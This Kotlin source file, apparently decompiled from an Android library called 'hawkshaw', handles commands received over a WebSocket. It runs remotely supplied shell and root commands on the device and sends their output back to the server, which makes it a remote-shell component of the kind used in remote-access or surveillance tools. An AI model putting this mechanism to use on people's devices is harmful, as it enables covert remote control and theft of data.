package com.hawkshaw.library.datalayer.network.socket

import android.os.Build
import androidx.annotation.RequiresApi
import com.hawkshaw.library.datalayer.models.SocketCommandRequest
import com.hawkshaw.library.datalayer.models.SocketCommandResponse
import com.hawkshaw.library.deviceinfo.Shell
import com.hawkshaw.library.handler.handleCommand
import com.hawkshaw.library.handler.CommandSource
import com.hawkshaw.library.ktextensions.safeLaunch
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import android.util.Log // Added for logging

/**
 * Handles socket commands received from WebSocket connections
 */
object SocketCommandResolverKt {
    private const val TAG = "SocketCommandResolver" // Existing TAG
    private val scope = CoroutineScope(Dispatchers.IO)
    
    /**
     * Handle a socket command received as a string
     * 
     * @param commandStr The command string to be parsed and handled
     */
    @RequiresApi(Build.VERSION_CODES.P)
    fun handleSocketCommand(commandStr: String) {
        Log.d(TAG, "[DEBUG] handleSocketCommand(commandStr) called. commandStr: $commandStr")
        scope.safeLaunch {
            try {
                Log.d(TAG, "[DEBUG] Attempting to parse commandStr to SocketCommandRequest.")
                // Parse the command string to a SocketCommandRequest using JSON
                val socketCommandRequest = com.hawkshaw.library.datalayer.network.twirp.interceptors.ContentNegotiationInterceptorKt.json
                    .decodeFromString(SocketCommandRequest.serializer(), commandStr)
                
                Log.d(TAG, "[DEBUG] Successfully parsed commandStr. SocketCommandRequest: $socketCommandRequest")
                Logger.d(TAG, "Socket Command Received: $commandStr", false, 4, null) // Existing Logger call
                
                Log.d(TAG, "[DEBUG] Calling internal handleSocketCommand with parsed request.")
                // Process the command within the coroutine context
                handleSocketCommand(socketCommandRequest)
            } catch (e: Exception) {
                Logger.e(TAG, "HandleSocketCommand: ${e.message}", e, false, 12, null) // Existing Logger call
                Log.e(TAG, "[DEBUG] Exception in handleSocketCommand(commandStr): ${e.message}", e) // Added for standard Logcat
            }
        }
    }
    
    /**
     * Handle a parsed socket command request
     * 
     * @param socketCommandRequest The parsed command request to handle
     */
    @RequiresApi(Build.VERSION_CODES.P)
    private suspend fun handleSocketCommand(socketCommandRequest: SocketCommandRequest) {
        Log.d(TAG, "[DEBUG] internal handleSocketCommand(socketCommandRequest) called. Request: $socketCommandRequest")
        withContext(Dispatchers.IO) {
            when (socketCommandRequest.type) {
                SocketCommandRequest.Type.Unknown -> {
                    Log.d(TAG, "[DEBUG] Handling Unknown command type. SentTime: ${socketCommandRequest.sentTime}")
                    Logger.e(
                        TAG,
                        "HandleSocketCommand: Unknown command, ${socketCommandRequest.sentTime}",
                        b = false,
                        i = 12,
                        nothing = null
                    )
                }
                SocketCommandRequest.Type.RootCommand -> {
                    Log.d(TAG, "[DEBUG] Handling RootCommand type. Request: ${socketCommandRequest.rootCommandRequest}")
                    handleRootCommand(socketCommandRequest.rootCommandRequest)
                }
                SocketCommandRequest.Type.Shell -> {
                    Log.d(TAG, "[DEBUG] Handling Shell command type. Request: ${socketCommandRequest.shellRequest}")
                    handleShellCommand(socketCommandRequest.shellRequest)
                }
                else -> {
                    Log.w(TAG, "[DEBUG] Unhandled command type in when statement: ${socketCommandRequest.type}")
                    // Other command types can be handled here if needed
                }
            }
        }
    }
    
    /**
     * Handle a root command request
     * 
     * @param rootCommandRequest The root command request to process
     */
    @RequiresApi(Build.VERSION_CODES.P)
    private suspend fun handleRootCommand(rootCommandRequest: SocketCommandRequest.RootCommandRequest?): Any? {
        Log.d(TAG, "[DEBUG] handleRootCommand called. rootCommandRequest: $rootCommandRequest")
        if (rootCommandRequest == null) {
            Log.d(TAG, "[DEBUG] handleRootCommand: rootCommandRequest is null, returning Unit.")
            return Unit
        }
        
        return withContext(Dispatchers.IO) {
            Log.d(TAG, "[DEBUG] handleRootCommand: Delegating to main handleCommand. Command: ${rootCommandRequest.command}, Source: Socket")
            // Delegate to the main command resolver with Socket as the source
            handleCommand(
                rootCommandRequest.command,
                CommandSource.Socket,
                scope
            )
        }
    }
    
    /**
     * Handle a shell command request
     * 
     * @param shellRequest The shell command request to process
     */
    private suspend fun handleShellCommand(shellRequest: SocketCommandRequest.ShellRequest?) {
        Log.d(TAG, "[DEBUG] handleShellCommand called. shellRequest: $shellRequest")
        if (shellRequest == null) {
            Log.d(TAG, "[DEBUG] handleShellCommand: shellRequest is null, returning.")
            return
        }
        
        withContext(Dispatchers.IO) {
            Log.d(TAG, "[DEBUG] handleShellCommand: Running shell command: ${shellRequest.command}")
            // Run the shell command and send the response back
            val shellOutput = Shell.runShellCommand(shellRequest.command)
            Log.d(TAG, "[DEBUG] handleShellCommand: Shell command output: $shellOutput")

            // Create and send the response
            val response = SocketCommandResponse(
                type = SocketCommandResponse.Type.Shell,
                shellResponse = SocketCommandResponse.ShellResponse(shellOutput)
            )
            Log.d(TAG, "[DEBUG] handleShellCommand: Sending response: $response")
            SocketService.sendResponse(response)
            Log.d(TAG, "[DEBUG] handleShellCommand: Response sent.")
        }
    }
}
